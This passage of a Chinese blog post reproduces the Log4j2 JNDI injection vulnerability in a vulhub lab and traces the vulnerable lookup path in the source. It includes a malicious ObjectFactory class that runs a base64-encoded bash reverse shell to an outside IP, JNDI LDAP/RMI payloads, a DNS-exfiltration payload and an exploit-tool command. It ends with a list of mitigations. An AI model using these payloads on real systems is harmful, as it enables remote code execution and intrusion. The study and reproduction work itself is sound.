</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">RMIHello</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">getObjectInstance</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Context</span><span class="w"> </span><span class="n">nameCtx</span><span class="p">,</span><span class="w"> </span><span class="n">Hashtable</span><span class="o">&lt;?</span><span class="p">,</span><span class="w"> </span><span class="o">?&gt;</span><span class="w"> </span><span class="n">environment</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div><p>编译为 class 字节码，然后启动 http 监听，</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220508413.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220508413.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220508413.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220508413.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220508413.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220508413.png" /></p>
<p>payload：<code>${jndi:rmi://localhost:1099/hello}</code>，最后成功执行，</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220323545.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220323545.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220323545.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220323545.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220323545.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220323545.png" />
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220732414.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220732414.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220732414.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220732414.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220732414.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130220732414.png" /></p>
<p>然后再在 vulhub 靶场复现一次，搭建好靶场后访问 <code>8983</code> 端口，传入下面 payload 验证漏洞</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/solr/admin/cores?action=${jndi:ldap://620de897.log.dnslog.sbs.}</span></span></code></pre></div></div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171554334.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171554334.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171554334.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171554334.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171554334.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171554334.png" /></p>
<p>dns 收到请求，</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171615211.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171615211.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171615211.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171615211.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171615211.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171615211.png" /></p>
<p>这里打 Ladp，因为是本地搭建的靶场，所以本地搭建 LdapServer 服务，然后在远程端进行 http 监听，远程端的恶意利用类改为反弹 shell 的命令，</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Context</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Name</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.spi.ObjectFactory</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">LDAP_POC</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">ObjectFactory</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">LDAP_POC</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">getObjectInstance</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Context</span><span class="w"> </span><span class="n">nameCtx</span><span class="p">,</span><span class="w"> </span><span class="n">Hashtable</span><span class="o">&lt;?</span><span class="p">,</span><span class="w"> </span><span class="o">?&gt;</span><span class="w"> </span><span class="n">environment</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div><p>传入 payload，</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${jndi:ldap://ip:9999/LDAP_POC}</span></span></code></pre></div></div><p>成功反弹 shell</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171922795.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171922795.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171922795.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171922795.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171922795.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131171922795.png" /></p>
<p>尝试利用工具来进行攻击，工具下载地址：<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0" target="_blank" rel="noopener noreffer ">https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0</a>，然后构建命令进行监听，</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="s2">&#34;bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}&#34;</span> -A <span class="s2">&#34;47.109.156.81&#34;</span></span></span></code></pre></div></div><p><code>bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}</code> 就是 exec 里面执行的命令，-A 参数是攻击机 ip，</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174427900.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174427900.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174427900.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174427900.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174427900.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174427900.png" /></p>
<p>然后根据 jdk 版本选择 payload 传入，这个 jdk 版本可以通过命令 <code>${jndi:rmi://${sys:java.version}.vbdpkn.ceye.io}</code> 进行 dns 外带查看，这里选择 jdk1.8 版本的，</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">${jndi:ldap://47.109.156.81:1389/nvxwvy}</span></span></code></pre></div></div><p>最后也能成功反弹 shell</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174642029.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174642029.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174642029.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174642029.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174642029.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174642029.png" />
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174651091.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174651091.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174651091.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174651091.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174651091.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250131174651091.png" /></p>
<h2 id="漏洞分析">漏洞分析</h2>
<p>来到 <code>PatternLayout#toSerializable</code> 方法，对 <code>formatters</code> 进行循环处理，</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130221809547.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130221809547.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130221809547.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130221809547.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130221809547.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130221809547.png" /></p>
<p>在循环到第七次时，跟进到 format 方法，先判断是否是 Log4j2 的 lookups 功能。这里我们是 lookups 功能，所以可以继续往下走。会遍历 workingBuilder 来进行判断；如果 workingBuilder 中存在<code>${</code>，那么就会取出从 $ 开始知道最后的字符串，这一步</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130222747124.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130222747124.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130222747124.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130222747124.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130222747124.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130222747124.png" /></p>
<p>最后得到 value 为，</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223022729.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223022729.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223022729.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223022729.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223022729.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223022729.png" /></p>
<p>继续跟进 <code>replace()</code> 方法，<code>replace()</code> 方法里面调用了 <code>substitute()</code> 方法，这里就是将 ${} 中间的内容取出来，然后又会调用 <code>this.subtitute</code> 来处理。最后调用到 <code>resolveVariable</code> 方法，</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223501895.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223501895.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223501895.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223501895.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223501895.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223501895.png" /></p>
<p><code>resolver</code>解析时支持的关键词有<code>[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]</code>，而我们这里利用的<code>jndi:xxx</code>后续就会用到<code>JndiLookup</code>这个解析器</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223658805.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223658805.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223658805.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223658805.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223658805.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223658805.png" /></p>
<p>这个 <code>lookup()</code> 方法也就是 jndi 里面原生的方法，在我们让 jndi 去调用 rmi 服务的时候，是调用原生的 <code>lookup()</code> 方法的，是存在漏洞的。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223937133.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223937133.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223937133.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223937133.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223937133.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223937133.png" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223917012.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223917012.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223917012.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223917012.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223917012.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130223917012.png" /></p>
<p>最后成功执行。</p>
<h2 id="漏洞修复">漏洞修复</h2>
<ul>
<li>更新log4j至 rc2</li>
<li>配置防火墙策略，禁止主动连接外网设备</li>
<li>升级受影响的应用及组件</li>
<li>过滤相关的关键词，比如<code>${jndi://*}</code></li>
<li>限制JNDI默认可以使用的协议</li>
<li>限制可以通过LDAP访问的服务器和类</li>
</ul>
<p>参考：<a href="https://www.freebuf.com/articles/web/341857.html" target="_blank" rel="noopener noreffer ">https://www.freebuf.com/articles/web/341857.html</a></p>
<p>参考：<a href="https://www.freebuf.com/articles/web/380568.html" target="_blank" rel="noopener noreffer ">https://www.freebuf.com/articles/web/380568.html</a></p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2025-02-09</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/log4j2/" data-title="Log4j2 漏洞复现" data-hashtags="java,漏洞复现"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/log4j2/" data-hashtag="java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a>,&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/" class="prev" rel="prev" title="Github Pages博客搭建教程"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Github Pages博客搭建教程</a>
            <a href="/posts/aliyunctf/" class="next" rel="next" title="AliyunCTF 2025 部分wp">AliyunCTF 2025 部分wp<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.140.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">gaorenyusi</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a>
        </div>

        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.zh.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
</html>
